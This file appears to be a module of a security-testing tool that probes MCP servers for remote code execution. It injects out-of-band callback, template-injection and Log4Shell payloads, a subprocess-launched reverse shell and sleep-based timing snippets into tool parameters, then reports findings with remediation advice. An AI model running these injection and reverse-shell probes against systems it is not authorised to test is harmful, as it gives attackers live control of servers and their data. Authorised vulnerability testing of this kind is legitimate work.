"""
Remote Code Execution (MCP, language-runtime surface).

Targets MCP tools whose string params are likely interpreted as code by
an embedded runtime — eval-style evaluators, Jinja/SSTI sinks, Node
`vm`, Python `exec`, PHP `eval`, `Function` constructors, etc.

Confirms via OOB callback (the callback URL is reached from inside the
target process). Timing-only fallback for environments with egress
blocking.
"""

import time as _time


_CODE_KEYWORDS = (
    "eval", "exec", "run", "script", "code", "template", "render", "compile",
    "python", "node", "javascript", "ruby", "php", "function", "lambda",
    "formula", "calc", "jinja", "handlebars", "mustache",
)


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "remote_code_execution"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    oob_wait = int(params.get("oob_wait_seconds", 20))
    sleep_seconds = int(params.get("sleep_seconds", 8))
    only_tool_names = params.get("only_tool_names") or []
    languages = params.get("languages") or ["python", "node", "php", "ruby", "java"]
    include_ssti = bool(params.get("include_ssti", True))
    include_log4shell = bool(params.get("include_log4shell", True))
    try_reverse_shell = bool(params.get("try_reverse_shell", True))
    rs_wait = int(params.get("rs_wait_seconds", 15))
    tool_keywords = params.get("tool_keywords") or list(_CODE_KEYWORDS)
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None

    mcp = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            errs = disc.get("errors") or []
            detail = errs[0] if errs else {}
            init_resp = (disc.get("raw") or {}).get("initialize") or {}
            rb.error(
                f"MCP initialize failed. step={detail.get('step','init')} "
                f"status={init_resp.get('status')} "
                f"transport={init_resp.get('transport')} "
                f"error={detail.get('error') or init_resp.get('error')} "
                f"target_base_url={target.get('base_url')}")
            rb.add_evidence(evidence.ev_mcp_call(
                init_resp, note="failed initialize"))
            return rb.finalize(success=False)
        tools = disc.get("tools") or []

        if only_tool_names:
            cands = [t for t in tools if t.get("name") in set(only_tool_names)]
        else:
            cands = [t for t in tools
                     if any(k in f"{t.get('name','')} {t.get('description','')}".lower()
                            for k in tool_keywords)]
        if not cands:
            rb.warn("No obvious code-runtime tools. Try 'only_tool_names'.")
            return rb.finalize(success=True)
        rb.info(f"Candidate code-runtime tools: {[t.get('name') for t in cands]}")

        oob_payloads = payloads.get("rce") or []
        oob_payloads = [p for p in oob_payloads
                         if "oob" in (p.get("tags") or [])
                         and any(lang in (p.get("tags") or []) for lang in languages)]
        if include_ssti:
            oob_payloads += [p for p in (payloads.get("rce:ssti") or [])
                              if "ssti" in (p.get("tags") or [])]
        if include_log4shell:
            oob_payloads += payloads.get("rce:log4shell") or \
                            payloads.get("log4shell") or []
        rb.info(f"RCE payload set: {len(oob_payloads)} (langs={languages}, "
                f"ssti={include_ssti}, log4shell={include_log4shell})")

        timing_marker = f"__import__('time').sleep({sleep_seconds})"
        timing_variants = {
            "python": timing_marker,
            "node": f"require('child_process').execSync('sleep {sleep_seconds}')",
            "ruby": f"sleep {sleep_seconds}",
            "bash": f"sleep {sleep_seconds}",
        }

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            str_params = _string_params(schema)
            for pname in str_params:
                base_args = _fill_defaults(schema)

                # -- OOB --
                confirmed = False
                for p in oob_payloads:
                    token = oob.mint(attack_id="rce", ttl=oob_wait + 20,
                                     metadata={"tool": tname, "param": pname,
                                               "lang": next((t for t in (p.get("tags") or [])
                                                              if t in ("python","node","php","ruby")),
                                                             "unknown")})
                    payload_str = str(p["content"]).replace("{OOB_URL}", token.url)
                    args = dict(base_args); args[pname] = payload_str
                    r = mcp.call_tool_safe(tname, args)
                    rb.add_evidence(evidence.ev_mcp_call(
                        r, note=f"RCE OOB probe {tname}[{pname}]"))
                    hits = oob.wait(token.token, timeout=oob_wait)
                    if hits:
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "remote_code_execution"),
                            title=f"Remote Code Execution CONFIRMED on '{tname}' / '{pname}'",
                            category="rce",
                            severity="critical",
                            confidence="confirmed",
                            cwe="CWE-94",
                            tool=tname,
                            parameter=pname,
                            payload=payload_str,
                            description=(
                                "Payload triggered an out-of-band HTTP callback from the "
                                "target process, confirming arbitrary code execution inside "
                                "the MCP server's language runtime. Callback source IP and "
                                "headers captured in evidence."
                            ),
                            impact=(
                                "Full compromise of the MCP server process. Attacker can "
                                "read any data the process has access to, call any tool, "
                                "pivot into connected systems, and persist."
                            ),
                            remediation=(
                                "Remove runtime-evaluation from MCP tools. If evaluation is "
                                "essential, sandbox it (gVisor, nsjail, Wasm) with no outbound "
                                "network, no filesystem, strict CPU/memory limits, and a "
                                "capability-based API for interacting with the host."
                            ),
                            references=["https://cwe.mitre.org/data/definitions/94.html"],
                            evidence=[evidence.ev_oob_hit(token.token, hits,
                                                          note="Proof of code execution"),
                                      evidence.ev_mcp_call(r)],
                        ))
                        oob.release(token.token)
                        confirmed = True
                        break
                    oob.release(token.token)

                if confirmed:
                    continue

                # -- Reverse-shell confirmation (high-value PoC) --
                if try_reverse_shell:
                    try:
                        listener = reverse_shell.mint(
                            attack_id="rce", ttl=rs_wait + 10,
                            bind_host="0.0.0.0")
                    except Exception as e:
                        rb.warn(f"Could not mint reverse-shell listener: {e}")
                        listener = None
                    if listener is not None:
                        rs_payload = reverse_shell.gen_payload(listener,
                                                                flavor="python")
                        args = dict(base_args); args[pname] = (
                            "__import__('subprocess').Popen("
                            f"'''{rs_payload}''', shell=True)")
                        r = mcp.call_tool_safe(tname, args)
                        rb.add_evidence(evidence.ev_mcp_call(
                            r, note=f"RCE reverse-shell probe {tname}[{pname}]"))
                        session = reverse_shell.wait(listener.token,
                                                      timeout=rs_wait)
                        reverse_shell.release(listener.token)
                        if session and session.get("connected"):
                            rb.add_finding(evidence.Finding(
                                attack_id=context.get("attack_id",
                                                       "remote_code_execution"),
                                title=(f"RCE CONFIRMED via reverse shell on "
                                       f"'{tname}' / '{pname}'"),
                                category="rce",
                                severity="critical",
                                confidence="confirmed",
                                cwe="CWE-94",
                                tool=tname, parameter=pname,
                                payload=rs_payload,
                                description=(
                                    "Target opened an outbound TCP connection "
                                    f"from {session.get('remote_ip')} and "
                                    f"sent {session.get('bytes',0)} bytes to "
                                    "Minerva's listener. Interactive-shell "
                                    "evidence captured (first bytes preserved)."
                                ),
                                impact=(
                                    "Live interactive access to the MCP host. "
                                    "Attacker can pivot, persist, and exfiltrate "
                                    "at will."
                                ),
                                remediation=(
                                    "Strict egress filtering at the MCP host. "
                                    "Remove any eval/exec primitive from tool "
                                    "bodies. Run MCP servers in a network "
                                    "namespace with only allow-listed upstreams."
                                ),
                                evidence=[
                                    evidence.ev_raw(
                                        "reverse-shell session",
                                        session),
                                    evidence.ev_mcp_call(r),
                                ],
                            ))
                            continue

                # -- Timing fallback --
                for lang, snippet in timing_variants.items():
                    args = dict(base_args); args[pname] = snippet
                    t0 = _time.time()
                    r = mcp.call_tool_safe(tname, args)
                    dt = _time.time() - t0
                    if dt >= sleep_seconds - 2:
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "remote_code_execution"),
                            title=f"Probable RCE ({lang}, timing) on '{tname}' / '{pname}'",
                            category="rce",
                            severity="critical",
                            confidence="high",
                            cwe="CWE-94",
                            tool=tname, parameter=pname, payload=snippet,
                            description=(
                                f"Injected {lang} sleep caused a response delay of "
                                f"{dt:.2f}s. The runtime interpreted the code."
                            ),
                            remediation="See confirmed finding.",
                            evidence=[evidence.ev_mcp_call(r)],
                        ))
                        break

        return rb.finalize()
    finally:
        mcp.close()


def _string_params(schema):
    return [n for n, s in ((schema or {}).get("properties") or {}).items()
            if isinstance(s, dict) and s.get("type") == "string"]


def _fill_defaults(schema):
    out = {}
    props = (schema or {}).get("properties") or {}
    for n in ((schema or {}).get("required") or []):
        t = ((props.get(n) or {}).get("type"))
        out[n] = {"string": "a", "integer": 1, "number": 1, "boolean": False,
                  "array": [], "object": {}}.get(t, "")
    return out
